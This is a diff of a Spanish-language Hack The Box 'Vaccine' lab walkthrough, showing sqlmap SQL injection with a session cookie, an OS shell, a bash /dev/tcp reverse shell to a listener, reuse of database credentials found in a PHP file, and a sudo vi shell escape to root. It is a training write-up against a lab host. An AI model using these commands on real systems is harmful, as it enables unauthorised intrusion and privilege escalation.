@@ -29,7 +29,42 @@ HACK THE BOX - VACCINE MACHINE
 
             -Como en un principio vimos que existian 3 puertos abierto dentro de los cuales uno era el puerto 80 con servidor Apache corriendo con Ubuntu, nos conectamos a la web mediante firefox http://10.129.94.11
             -En donde encontramos una web con credeciales para ingresar, probamos las convencionales, y posterior probamos lo encontrado anteriormente [admin:qwerty789], y nos damos cuenta que podemos ingresar a un tipo de base de datos, ademas podemos ver que la pagina se encuentra hecha en PHP
-            -Explorando verificamos que existe una posible vulnerabilidad mediante SQL Injection en el parámetro "Search" en la URL, para ello utilizaremos un metodo de SQL injection automatizado llamado sqlmap.
+            -Explorando verificamos que existe una posible vulnerabilidad mediante SQL Injection en el parámetro "Search" en la URL, para ello utilizaremos un método de SQL injection automatizado llamado sqlmap.
 
- 
+- sqlmap --help                                                                                                                             -El formato de ingreso de sqlmap es: sqlmap -u ['URL con parámetro vulnerable'] --cookie ['Nombre de sesion:cookie'], con el comando verificamos si es posible una explitación de sql injection, posterior realizaremos la injection
 
+            -Una vez visto los parámetros de entrada de sqlmap, necesitamos obtener el nombre de la sesion y las cookies de la sesion, para lo cual podemos usar burpsuite, una extensión llamada "Cookie editor" o simplemete con la "inspección" de firefox, en Storage encontraremos información de la sesion y las cookies.
+
+- sqlmap -u 'http://10.129.94.11/dashboard.php?search=any+query' --cookie 'PHPSESSID=u289l02i87aop1f7ha1vleb96c'                            -Como salida obtenemos: "GET parameter 'search' is vulnerable.", (Importante que se encuentren bien ingresados los datos)
+- sqlmap -u 'http://10.129.94.11/dashboard.php?search=any+query' --cookie 'PHPSESSID=u289l02i87aop1f7ha1vleb96c' --os-shell                 -Al ver que si es vulnerable iniciamos una sesion shell, añadiendo el comando "--os-shell"
+
+            -Para una mayor comodidad establecemos una reverse shell connection a nuestra maquina.
+
+- nc -lvnp 4444                                                                                                                             -Establecemos con Netcat modo listener en el puerto 4444
+- bash -c "bash -i >& /dev/tcp/10.10.14.221/4444 0>&1"                                                                                      -Establecemos la conexión Reverse Shell, esta conexión es un poco inestable por lo tanto tendremos que establecer la reverse shell un par de veces mientras realizamos nuestra indagatoria
+
+    (Reverse Shell en nuestra maquina) 
+- import -c 'import pty;pty.spawn("/bin/bash")'                                                                                             -Se abrirá una nueva shell interactiva de Bash que permitirá al usuario interactuar con el sistema operativo y ejecutar comandos de Bash
+- sudo -l                                                                                                                                   -Verificamos los permisos que tenemos y lo que podemos ejecutar, pero nos pide una pass para poder ver, po lo tanto procedemos a seguir indagando,
+- cd /var/www/html                                                                                                                          -Relacionado a la web, en el directorio html encontramos varios archivos.
+- cat dashboard.php                                                                                                                         -Indagando en el archivo .php encontramos credenciales de inicio de sesión "$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!")"
+
+            -Encontramos credenciales de sesión para el user=postgres con password=P@s5w0rd! y si nos damos cuenta nos encontramos en la sesion postgres por lo tanto intentamos nuevamente verificar nuestros permisos, y al ser la reverse shell inestable nos intentamos conectar mediante ssh con la credencial obtenida
+
+- sudo ssh postgres@10.129.94.11                                                                                                            -Nos pedira las credenciale, la cual ingresamos y nos conectamos mediante ssh, una conexion estable.
+- sudo -l                                                                                                                                   -Verificamos que tenemos permisos de ejecución de "/bin/vi /etc/postgresql/11/main/pg_hba.conf", tener permisos de ejecución de vi, lo cual podemos explotar de la siguiente manera.
+- sudo vi /etc/postgresql/11/main/pg_hba.conf                                                                                               -Ejecutamos vi con sudo y del archivo ph_hba.conf, nos damos cuenta que tenemos permisos de ejecución, para lo cual luego ejecutamos los comandos dentro de vi
+
+    (Dentro de vi)
+- :set shell=/bin/sh                                                                                                                        -Se está cambiando la configuración del shell predeterminado utilizado por Vim. El valor /bin/sh indica que el shell utilizado será el Bourne shell.   
+- :shell                                                                                                                                    -Comando para abrir una subshell o una nueva instancia de tu shell de sistema dentro de Vim. Al ejecutar :shell, se pausará temporalmente Vim y se te llevará al shell de sistema en el que podrás ejecutar comandos    
+- ls
+- cat user.txt
+- su root
+- cd ~
+- cd root
+- cat root.txt
+
+
+            -Visualiazmos las FLAGS y hemos terminado con la maquina
+            
